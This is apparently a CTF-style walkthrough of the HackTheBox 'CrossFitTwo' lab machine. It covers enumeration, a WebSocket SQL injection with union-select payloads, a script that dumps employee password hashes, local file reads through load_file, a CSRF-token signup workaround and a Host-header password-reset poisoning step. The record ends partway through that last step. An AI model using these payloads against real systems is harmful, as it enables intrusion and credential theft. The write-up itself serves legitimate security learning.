---
layout: post
title: "[HTB] CrossFitTwo"
description: "[Machine] - Insane difficulty"
background: '/img/bg-machine.jpg'
tags: [htb]
difficulty: Insane
---

![CrossFitTwo](/img/htb_img/CrossFitTwo_img/CrossFitTwo.png)

OS: OpenBSD
IP: 10.10.10.232
Complete: Yes
Created time: July 7, 2025 4:24 PM
Level: Insane
Status: Done

# Enumeration

## Nmap Recon

```bash
❯ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 16:27 CEST
Initiating SYN Stealth Scan at 16:27
Scanning 10.10.10.232 [65535 ports]
Discovered open port 80/tcp on 10.10.10.232
Discovered open port 22/tcp on 10.10.10.232
Discovered open port 8953/tcp on 10.10.10.232
Completed SYN Stealth Scan at 16:28, 57.63s elapsed (65535 total ports)
Nmap scan report for 10.10.10.232
Host is up, received user-set (0.039s latency).
Scanned at 2025-07-07 16:27:11 CEST for 58s
Not shown: 60696 filtered tcp ports (no-response), 4836 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
8953/tcp open  ub-dns-control syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 57.71 seconds
           Raw packets sent: 130121 (5.725MB) | Rcvd: 4839 (193.572KB)
```

Scripts and versions.

```bash
❯ nmap -p22,80,8953 -sCV -Pn -oN targeted $target                                                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 16:29 CEST
Nmap scan report for 10.10.10.232
Host is up (0.040s latency).

PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 9.5 (protocol 2.0)
| ssh-hostkey: 
|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)
|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)
80/tcp   open  http                (PHP 7.4.12)
|_http-title: CrossFit
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-type: text/html; charset=UTF-8
|     Date: Mon, 07 Jul 2025 14:29:15 GMT
|     Server: OpenBSD httpd
|     X-Powered-By: PHP/7.4.12
|     <!DOCTYPE html>
|     <html lang="zxx">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="description" content="Yoga StudioCrossFit">
|     <meta name="keywords" content="Yoga, unica, creative, html">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta http-equiv="X-UA-Compatible" content="ie=edge">
|     <title>CrossFit</title>
|     <!-- Google Font -->
|     <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap" rel="stylesheet">
|     <link href="https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap" rel="stylesheet">
|     <!-- Css Styles -->
|     <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
|_    <link rel="stylesheet" href="css/font-
|_http-server-header: OpenBSD httpd
8953/tcp open  ssl/ub-dns-control?
| ssl-cert: Subject: commonName=unbound
| Not valid before: 2021-01-11T07:01:10
|_Not valid after:  2040-09-28T07:01:10
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=7/7%Time=686BD9BD%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,34EA,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-t
SF:ype:\x20text/html;\x20charset=UTF-8\r\nDate:\x20Mon,\x2007\x20Jul\x2020
SF:25\x2014:29:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nX-Powered-By:\x
SF:20PHP/7\.4\.12\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"zxx\">\n\n<he
SF:ad>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta
SF:\x20name=\"description\"\x20content=\"Yoga\x20StudioCrossFit\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"keywords\"\x20content=\"Yoga,\x20unica,\x20cr
SF:eative,\x20html\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20conte
SF:nt=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<met
SF:a\x20http-equiv=\"X-UA-Compatible\"\x20content=\"ie=edge\">\n\x20\x20\x
SF:20\x20<title>CrossFit</title>\n\n\x20\x20\x20\x20<!--\x20Google\x20Font
SF:\x20-->\n\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\.com
SF:/css\?family=PT\+Sans:400,700&display=swap\"\x20rel=\"stylesheet\">\n\x
SF:20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\.com/css\?famil
SF:y=Oswald:400,500,600,700&display=swap\"\x20rel=\"stylesheet\">\n\n\x20\
SF:x20\x20\x20<!--\x20Css\x20Styles\x20-->\n\x20\x20\x20\x20<link\x20rel=\
SF:"stylesheet\"\x20href=\"css/bootstrap\.min\.css\"\x20type=\"text/css\">
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/font-")%r(H
SF:TTPOptions,1FD2,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nCont
SF:ent-type:\x20text/html;\x20charset=UTF-8\r\nDate:\x20Mon,\x2007\x20Jul\
SF:x202025\x2014:29:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nX-Powered-
SF:By:\x20PHP/7\.4\.12\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"zxx\">\n
SF:\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20
SF:<meta\x20name=\"description\"\x20content=\"Yoga\x20StudioCrossFit\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"keywords\"\x20content=\"Yoga,\x20unica,\
SF:x20creative,\x20html\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20
SF:content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"ie=edge\">\n\x20\
SF:x20\x20\x20<title>CrossFit</title>\n\n\x20\x20\x20\x20<!--\x20Google\x2
SF:0Font\x20-->\n\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis
SF:\.com/css\?family=PT\+Sans:400,700&display=swap\"\x20rel=\"stylesheet\"
SF:>\n\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\.com/css\?
SF:family=Oswald:400,500,600,700&display=swap\"\x20rel=\"stylesheet\">\n\n
SF:\x20\x20\x20\x20<!--\x20Css\x20Styles\x20-->\n\x20\x20\x20\x20<link\x20
SF:rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/font-"
SF:);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.92 seconds
```

From the results we can extract some information about the host. We are dealing with a OpenBSD system machine running 3 open ports: SSH on port 22, a web server on port 80 running PHP 7.4.12 named `CrossFit`.
The other port is 8953, it says `ub-dns-control`  but i didn’t recognize this service, time to google it.

[Port 8953 (tcp/udp)](https://www.speedguide.net/port.php?port=8953)

In `SpeedGuide.net` we can find some information about this port. It’s running Unbound DNS Nameserver Control.

> Unbound dns nameserver control [NLnet Labs Support] (IANA official)
A vulnerability was found in Unbound due to incorrect default permissions, allowing any process outside the unbound group to modify the unbound runtime configuration. If a process can connect over localhost to port 8953, it can alter the configuration of unbound.service. This flaw allows an unprivileged attacker to manipulate a running instance, potentially altering forwarders, allowing them to track all queries forwarded by the local resolver, and, in some cases, disrupting resolving altogether.
> 
> 
> References: [[CVE-2024-1488](https://www.cve.org/CVERecord?id=CVE-2024-1488)]
> 

---

## TCP 22 - SSH

A basic try against the SSH service tells us that the system is accepting the `username+password` dupla to login.

```bash
❯ ssh test@$target
test@10.10.10.232's password: 
Permission denied, please try again.
test@10.10.10.232's password: 
Permission denied, please try again.
test@10.10.10.232's password: 
test@10.10.10.232: Permission denied ***(password).***
```

---

## TCP 8953 - Unbound DNS

```bash
❯ unbound-control -s $target@8953 status
```

Got nothing as a result for the command.

---

## TCP 80 - HTTP

Port 80 is hosting the website `CrossFit`.

![HTTP port 80 - CrossFit](/img/htb_img/CrossFitTwo_img/01.png)

HTTP port 80 - CrossFit

With the Wappalyzer extension we can confirm the site is using PHP 7.4.12 (worth for fuzzing)

![Wappalyzer](/img/htb_img/CrossFitTwo_img/02.png)

Wappalyzer

Checking the source code of the site, we find a subdomain `employees`.

![Source Code review](/img/htb_img/CrossFitTwo_img/03.png)

Source Code review

So, we add it to our hosts file to be able to access it.

```bash
❯ echo "$target crossfit.htb employees.crossfit.htb" | sudo tee -a /etc/hosts
10.10.10.232 crossfit.htb employees.crossfit.htb
```

Loading the employees webpage welcomes us with a login.

![employees.crossfit.htb](/img/htb_img/CrossFitTwo_img/04.png)

employees.crossfit.htb

We also have a php directory `/password-reset.php`.

### Directory Fuzzing → crossfit.htb

```bash
❯ gobuster dir -u http://$target -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.232
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 510] [--> /images/]
/img                  (Status: 301) [Size: 510] [--> /img/]
/css                  (Status: 301) [Size: 510] [--> /css/]
/js                   (Status: 301) [Size: 510] [--> /js/]
/vendor               (Status: 301) [Size: 510] [--> /vendor/]
Progress: 1733 / 220546 (0.79%)[ERROR] Get "http://10.10.10.232/ws": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
```

We get an error at `/ws`, searching for this on the internet says that we might be dealing with websockets.

Going back again to the Source Code of the webpage, we can find an interesting entry in the JS Plugins section:

```bash
    <!-- Js Plugins -->
    <script src="js/jquery-3.3.1.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/jquery.magnific-popup.min.js"></script>
    <script src="js/jquery.slicknav.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/circle-progress.min.js"></script>
    <script src="js/main.js"></script>
    
    <script src="js/ws.min.js"></script>
```

Inside of it we can see a communication to a WebSocket server at `ws://gym.crossfit.htb/ws/`.

I used a web called `unminify` to improve the code, because it was all written in a oneliner.

```bash
function updateScroll() {
    var e = document.getElementById("chats");
    e.scrollTop = e.scrollHeight;
}
var token,
    ws = new WebSocket("ws://gym.crossfit.htb/ws/"),
    pingTimeout = setTimeout(() => {
        ws.close(), $(".chat-main").remove();
    }, 31e3);
function check_availability(e) {
    var s = new Object();
    (s.message = "available"), (s.params = String(e)), (s.token = token), ws.send(JSON.stringify(s));
}
$(".chat-content").slideUp(),
    $(".hide-chat-box").click(function () {
        $(".chat-content").slideUp();
    }),
    $(".show-chat-box").click(function () {
        $(".chat-content").slideDown(), updateScroll();
    }),
    $(".close-chat-box").click(function () {
        $(".chat-main").remove();
    }),
    (ws.onopen = function () {}),
    (ws.onmessage = function (e) {
        "ping" === e.data
            ? (ws.send("pong"), clearTimeout(pingTimeout))
            : ((response = JSON.parse(e.data)),
              (answer = response.message),
              answer.startsWith("Hello!") && $("#ws").show(),
              (token = response.token),
              $("#chat-messages").append('<li class="receive-msg float-left mb-2"><div class="receive-msg-desc float-left ml-2"><p class="msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded">' + answer + "</p></div></li>"),
              updateScroll());
    }),
    $("#sendmsg").on("keypress", function (e) {
        if (13 === e.which) {
            $(this).attr("disabled", "disabled");
            var s = $("#sendmsg").val();
            if ("" !== s) {
                $("#chat-messages").append('<li class="send-msg float-right mb-2"><p class="msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded">' + s + "</p></li>");
                var t = new Object();
                (t.message = s), (t.token = token), ws.send(JSON.stringify(t)), $("#sendmsg").val(""), $(this).removeAttr("disabled"), updateScroll();
            }
        }
    });
```

When the server gets a message that starts with “Hello!” it shows the hidden chat container in the page.

```bash
answer.startsWith("Hello!") && $("#ws").show(),
```

I will add the `gym` domain to my hosts file and reload the page to see if it’s able to make a connection to the websocket and make the chat appear.

After reloading the webpage we can see that Arnold the assisstant lets us use some commands:

![Chat - help](/img/htb_img/CrossFitTwo_img/05.png)

Chat - help

![Chat - Coaches](/img/htb_img/CrossFitTwo_img/06.png)

Chat - Coaches

![Chat - Classes](/img/htb_img/CrossFitTwo_img/07.png)

Chat - Classes

![Chat - subscriptions](/img/htb_img/CrossFitTwo_img/08.png)

Chat - subscriptions

All plans are available except for the 6 months plan.

Nothing more interesting over here, so I should fire up Burpsuite to take a look to the connections using websockets.

# Foothold

When reloading the web we get two different interactions with the websocket:

![WebSocket HTTP Request](/img/htb_img/CrossFitTwo_img/09.png)

WebSocket HTTP Request

And the WebSocket message itself

![WebSocket initial message](/img/htb_img/CrossFitTwo_img/10.png)

WebSocket initial message

I also tryied intercepting the messages when we send a request with the `help` command to Arnold.

![WebSocket send help message](/img/htb_img/CrossFitTwo_img/11.png)

WebSocket send help message

![WebSocket response to help](/img/htb_img/CrossFitTwo_img/12.png)

WebSocket response to help

Looking at the messages, every message that we send has the token of the previous message that the server sent to us.

The only messages that we haven’t intercepted yet are the membership ones that check availability.

![image.png](/img/htb_img/CrossFitTwo_img/13.png)

We see a new parameter: debug.

```bash
"debug":"[id: 1, name: 1-month]"
```

It’s very interesting because it seems like it’s getting information from a database, depending on the params that we pass to it.

We try SQLI

```bash
{"message":"available","params":"3 or 1=1","token":"e6b34de5b31cc2a78c0e43eb7a03c9a7e38634ad3b88b4eaef7424d3787c77dc"}

{"status":"200","message":"Good news! This membership plan is available.","token":"a356f9c7a6bdff1ec143c6ce4f5b9f4459b596425e1a6b9a58e14797d2c128ec","debug":"[id: 1, name: 1-month]"}
```

---

So, the attack was succesful.

We try with this payload:

```bash
{"message":"available","params":"1 union select 1, group_concat(schema_name) from information_schema.schemata where schema_name not like '%schema' and schema_name != 'mysql' order by name desc; -- -","token":"dc2b08fc4d5e43f53bc66bab476b539404dfb01856b8a2b16ade336d42519f7a"}
```

![First SQLi](/img/htb_img/CrossFitTwo_img/14.png)

First SQLi

I wrote an automated script to exploit this easier and got the following information:

```bash
============================================================
    DATABASE ENUMERATOR VIA WEBSOCKET
============================================================
[*] Enumerating available databases...
[+] Found databases: crossfit, employees

[*] Starting data extraction...

====================
DATABASE: crossfit
====================
[*] Enumerating tables in crossfit...
[+] Found tables: membership_plans

----------------------------------------
TABLE: crossfit.membership_plans
----------------------------------------
[*] Enumerating columns in membership_plans...
[+] Found columns: id, name, base_price, current_price, available

[*] Extracting data from membership_plans...

[+] Data from membership_plans:
============================================================
Columns: id | name | base_price | current_price | available
============================================================
  1: 1 | 1-month | 99.99 | 99.99 | 1
  2: 2 | 3-months | 129.99 | 129.99 | 1
  3: 3 | 6-months | 209.99 | 189.99 | 0
  4: 4 | 1-year | 899.99 | 859.99 | 1

[+] Total rows found: 4

====================
DATABASE: employees
====================
[*] Enumerating tables in employees...
[+] Found tables: employees, password_reset

----------------------------------------
TABLE: employees.employees
----------------------------------------
[*] Enumerating columns in employees...
[+] Found columns: id, username, password, email

[*] Extracting data from employees...

[+] Data from employees:
============================================================
Columns: id | username | password | email
============================================================
  1: 1 | administrator | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | david.palmer@crossfit.htb
  2: 2 | wsmith | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | will.smith@crossfit.htb
  3: 3 | mwilliams | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | maria.williams@crossfit.htb
  4: 4 | jparker | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jack.parker@crossfit.htb

[+] Total rows found: 4

----------------------------------------
TABLE: employees.password_reset
----------------------------------------
[*] Enumerating columns in password_reset...
[+] Found columns: email, token, expires

[*] Extracting data from password_reset...

[+] Data from password_reset:
============================================================
Columns: email | token | expires
============================================================
  1: 1-month

[+] Total rows found: 1
```

I tryied to crack this four hashes but nothing came up. I then remembered that in the `employees` subdomain there was an option to put an email to reset the password. Now that we have the admin email here we can try that out.

When putting this email to reset the password it says: `Reset link sent, please check your email.`.

So, a reset link is active right now to change the admin password for the website, but we can’t send a phishing or something to test that out. 

But, in our automated script we can see that we got only one entry on the `password_reset` table, maybe if we run it again we can have something else.

```bash
[+] Data from password_reset:
============================================================
Columns: email | token | expires
============================================================
  1: david.palmer@crossfit.htb | 9838ed910a751d1777e165a28d171d9acdd80a8d9407e5393cd9aa8d72b74591 | 2025-07-07 16:38:26

[+] Total rows found: 1
```

But, when we visit the token on the website we get the following message:

```bash
http://employees.crossfit.htb/password-reset.php?token=9838ed910a751d1777e165a28d171d9acdd80a8d9407e5393cd9aa8d72b74591 

Invalid token.
```

I changed the automated script to use load_file function to read local files, and I checked it against the passwd file.

```bash
❯ python3 file_reader.py /etc/passwd
2025-07-07 17:37:18,161 - INFO - Attempting to read file: /etc/passwd
2025-07-07 17:37:18,374 - INFO - Successfully read /etc/passwd
root:*:0:0:Charlie &:/root:/bin/ksh
daemon:*:1:1:The devil himself:/root:/sbin/nologin
operator:*:2:5:System &:/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
_identd:*:29:29:identd:/var/empty:/sbin/nologin
_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
_x11:*:35:35:X Server:/var/empty:/sbin/nologin
_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
www:*:67:67:HTTP Server:/var/www:/sbin/nologin
_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin
_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
_file:*:104:104:file privsep:/var/empty:/sbin/nologin
_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin
lucille:*:1002:1002:,,,:/home/lucille:/bin/csh
node:*:1003:1003::/home/node:/bin/ksh
_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin
_redis:*:686:686:redis account:/var/redis:/sbin/nologin
david:*:1004:1004:,,,:/home/david:/bin/csh
john:*:1005:1005::/home/john:/bin/csh
ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin
_bgplgd:*:71:71:bgplgd Daemon:/nonexistent:/sbin/nologin
_dhcpcd:*:846:846:dhcpcd user:/var/empty:/sbin/nologin
```

The httpd.conf file to check for the website config.

```bash
❯ python3 file_reader.py /etc/httpd.conf
2025-07-07 17:38:38,881 - INFO - Attempting to read file: /etc/httpd.conf
2025-07-07 17:38:39,300 - INFO - Successfully read /etc/httpd.conf
# $OpenBSD: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $

types {
    include "/usr/share/misc/mime.types"
}

server "0.0.0.0" {
	no log
	listen on lo0 port 8000

        root "/htdocs"
        directory index index.php

	location "*.php*" {
		fastcgi socket "/run/php-fpm.sock"
	}
}

server "employees" {
	no log
	listen on lo0 port 8001

        root "/htdocs_employees"
        directory index index.php

	location "*.php*" {
		fastcgi socket "/run/php-fpm.sock"
	}
}

server "chat" {
	no log
	listen on lo0 port 8002

        root "/htdocs_chat"
        directory index index.html

	location match "^/home$" {
	   request rewrite "/index.html"
	}
	location match "^/login$" {
	   request rewrite "/index.html"
	}
	location match "^/chat$" {
	   request rewrite "/index.html"
	}
	location match "^/favicon.ico$" {
	   request rewrite "/images/cross.png"
	}
}
```

Three servers running on 8000, 8001, 8002, there must be another service working as a reverse proxy to serve on port 80. This machine is using OpenBSD so the relayd daemon could be present and working for this job.

```bash
❯ python3 file_reader.py /etc/relayd.conf
2025-07-07 17:40:28,839 - INFO - Attempting to read file: /etc/relayd.conf
2025-07-07 17:40:29,056 - INFO - Successfully read /etc/relayd.conf
table<1>{127.0.0.1}
table<2>{127.0.0.1}
table<3>{127.0.0.1}
table<4>{127.0.0.1}
http protocol web{
	pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
	pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
	match request path "/*" forward to <1>
	match request path "/ws*" forward to <4>
	http websockets
}

table<5>{127.0.0.1}
table<6>{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}
http protocol portal{
	pass request quick path "/" forward to <5>
	pass request quick path "/index.html" forward to <5>
	pass request quick path "/home" forward to <5>
	pass request quick path "/login" forward to <5>
	pass request quick path "/chat" forward to <5>
	pass request quick path "/js/*" forward to <5>
	pass request quick path "/css/*" forward to <5>
	pass request quick path "/fonts/*" forward to <5>
	pass request quick path "/images/*" forward to <5>
	pass request quick path "/favicon.ico" forward to <5>
	pass forward to <6>
	http websockets
}

relay web{
	listen on "0.0.0.0" port 80
	protocol web
	forward to <1> port 8000
	forward to <2> port 8001
	forward to <3> port 9999
	forward to <4> port 4419
}

relay portal{
	listen on 127.0.0.1 port 9999
	protocol portal
	forward to <5> port 8002
	forward to <6> port 5000 mode source-hash
}
```

We can see some interesting things, for example a bunch of other ports that we had no idea were being used, as well as a new domain `crossfit-club.htb`. I will add this to my hosts file and take a look.

![crossfit-club.htb](/img/htb_img/CrossFitTwo_img/15.png)

crossfit-club.htb

We can see that the SignUp option is disabled, so we need to work around the login one.

From the source code we can see that there is a call to a js file.

![JS files in club](/img/htb_img/CrossFitTwo_img/16.png)

JS files in club

Looking at the code of this script we can see that a call to /api/login is being performed.

![/api/login](/img/htb_img/CrossFitTwo_img/17.png)

/api/login

So, with this endpoint `api` I did a new fuzzing.

## Fuzzing API endpoint

```bash
❯ gobuster dir -u http://crossfit-club.htb/api -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crossfit-club.htb/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 66]
/ping                 (Status: 200) [Size: 71]

# And of course a POST fuzzing to the API
❯ gobuster dir -m POST -u http://crossfit-club.htb/api -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crossfit-club.htb/api
[+] Method:                  POST
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 50]
/signup               (Status: 200) [Size: 50]
/Login                (Status: 200) [Size: 50]
```

So, as a mashup we have:

```bash
/auth                 (Status: 200) [Size: 66]
/ping                 (Status: 200) [Size: 71]
/login                (Status: 200) [Size: 50]
/signup               (Status: 200) [Size: 50]
```

So, maybe sending a direct POST request to the Signup endpoint we get a hit and acquire an account.

```bash
❯ curl -d "username=test&password=test&confirm=test&email=test@test.com" http://crossfit-club.htb/api/signup
{"success":"false","message":"Invalid CSRF Token"}
```

Sending a request to the auth endpoint grants us a CSRF Token.

```bash
❯ curl http://crossfit-club.htb/api/auth
{"success":"false","token":"Adj2RdrK-2GruHb1P-c3zNYdotaNZPg1y6H4"}                                                                                                                                                                  
```

To check the options that we need to pass to the command for signing up, Curl gives us the option to ask for them.

```bash
❯ curl -X OPTIONS -v crossfit-club.htb/api/signup 2>&1 | grep Allow-Headers
< Access-Control-Allow-Headers: X-CSRF-TOKEN,Content-Type
```

But, everytime we send a curl to the auth endpoint it generates a new CSRF Token, so in order to use it to create the account I need to call it inside the message that we send to the server.

```bash
curl -b cookie -H "X-CSRF-TOKEN: `curl -sc cookie http://crossfit-club.htb/api/auth | awk -F'"' '{print $8}'`" -d "username=test&password=test&confirm=test&email=test@test.com" http://crossfit-club.htb/api/signup
```

But, it responds that only administrators can register accounts.

```bash
❯ curl -b cookie -H "X-CSRF-TOKEN: `curl -sc cookie http://crossfit-club.htb/api/auth | awk -F'"' '{print $8}'`" -d "username=test&password=test&confirm=test&email=test@test.com" http://crossfit-club.htb/api/signup
{"success":"false","message":"Only administrators can register accounts."}
```

Seems like we need to trick the administrator to generate an acc for us.

---

## Header injection attack

A vulnerability in reset password pages exists, changing the `Host` IP to our own in the request.

```bash
❯ nc -lvnp 80        
listening on [any] 80 ...
```

And in burpsuite we intercept a reset password request.

```bash
POST /password-reset.php HTTP/1.1
Host: 10.10.X.X
Content-Length: 33
Cache-Control: max-age=0
Origin: http://employees.crossfit.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://employees.crossfit.htb/password-reset.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

email=david.palmer%40crossfit.htb
```

